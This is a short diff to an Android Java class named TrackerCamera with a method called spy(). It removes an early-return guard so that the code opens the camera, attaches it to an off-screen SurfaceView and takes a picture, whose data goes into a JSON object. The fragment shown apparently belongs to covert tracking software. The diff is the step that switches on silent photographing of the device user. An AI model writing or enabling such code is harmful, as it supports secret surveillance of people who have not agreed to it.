@@ -9,15 +9,11 @@ import org.json.JSONObject;
 
 import java.io.IOException;
 
-class TrackerCamera implements TrackerMethod {
+class TrackerCamera extends TrackerMethod {
     @Override public void spy() {
 
-        if (true) return;
-
         for (int i=0;i< Math.min(1,Camera.getNumberOfCameras());i++) {
-
             Camera cam = Camera.open(i);
-
             try {
                 SurfaceView view = new SurfaceView(TrackerManager.get());
                 cam.setPreviewDisplay(view.getHolder());
@@ -26,7 +22,6 @@ class TrackerCamera implements TrackerMethod {
                 e.printStackTrace();
                 return;
             }
-
             cam.takePicture(null,null,null, (data, camera) -> {
                 try {
                     JSONObject ret = new JSONObject();
